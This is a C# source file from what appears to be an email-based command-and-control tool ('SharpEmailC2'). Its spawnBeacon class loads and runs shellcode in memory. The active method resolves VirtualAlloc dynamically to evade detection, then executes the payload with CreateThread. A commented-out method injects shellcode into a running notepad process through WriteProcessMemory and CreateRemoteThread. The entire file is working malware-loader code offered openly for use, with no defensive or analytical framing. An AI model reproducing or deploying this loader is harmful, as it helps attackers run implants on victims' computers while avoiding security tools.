using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SharpEmailC2
{
    public class spawnBeacon : ISpawnBeacon
    {
        /*
        #region Windows API Importing Section
        private static readonly UInt32 MEM_COMMIT = 0x1000;
        private static readonly UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        #endregion
        //使用进程注入的方式执行shellcode
        public void SpawnBeacon(byte[] buffer)
        {
            try
            {
                IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
                IntPtr lpThreadId = IntPtr.Zero;

                int targetid = 0;
                targetid = SearchForTargetID("notepad");
                IntPtr procHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)targetid);
                Console.WriteLine($"[+] Getting the handle for the target process: {procHandle}.");
                IntPtr remoteAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)buffer.Length, (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                Console.WriteLine($"[+] Allocating memory in the remote process {remoteAddr}.");
                Console.WriteLine($"[+] Writing shellcode at the allocated memory location.");
                if (WriteProcessMemory(procHandle, remoteAddr, buffer, (uint)buffer.Length, out lpNumberOfBytesWritten))
                {
                    Console.WriteLine($"[+] Shellcode written in the remote process.");
                    CreateRemoteThread(procHandle, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out lpThreadId);
                }
                else
                {
                    Console.WriteLine($"[+] Failed to inject shellcode.");
                }

            }
            catch (Exception ex)
            {
                throw;
                Console.WriteLine(ex.Message);
            }

        }
        
        */

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        #region Reflective DLL Injection flags
        //http://www.pinvoke.net/default.aspx/kernel32/OpenProcess.html
        public enum ProcessAccessRights
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        public enum MemAllocation
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x1000000,
            SecCommit = 0x08000000
        }

        //https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
        public enum MemProtect
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
        }

        #endregion

        public int SearchForTargetID(string process)
        {
            int pid = 0;
            int session = Process.GetCurrentProcess().SessionId;
            Process[] allprocess = Process.GetProcessesByName(process);

            try
            {
                foreach (Process proc in allprocess)
                {
                    if (proc.SessionId == session)
                    {
                        pid = proc.Id;
                        Console.WriteLine($"[+] Target process ID found: {pid}.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                Console.WriteLine(ex.Message);
            }
            return pid;
        }

        //https://stackoverflow.com/questions/3710132/byte-array-cryptography-in-c-sharp

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [Flags]
        private enum AllocationType
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_RESET = 0x80000
        }

        [Flags]
        private enum MemoryProtection
        {
            PAGE_EXECUTE_READWRITE = 0x40
        }

        static IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect)
        {
            IntPtr kernel32 = LoadLibrary("kernel32.dll");
            IntPtr procAddress = GetProcAddress(kernel32, "VirtualAlloc");
            VirtualAllocDelegate virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(VirtualAllocDelegate));
            return virtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        //使用D/invoke直接运行shellcode
        public void SpawnBeacon(byte[] shellcode)
        {
            try
            {
                IntPtr ptr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.MEM_COMMIT | AllocationType.MEM_RESERVE, MemoryProtection.PAGE_EXECUTE_READWRITE);
                Marshal.Copy(shellcode, 0, ptr, shellcode.Length);

                IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForSingleObject(threadHandle, 0xFFFFFFFF);
            }
            catch (Exception ex)
            {
                //throw;
                Console.WriteLine(ex.Message);
            }
        }



    }
}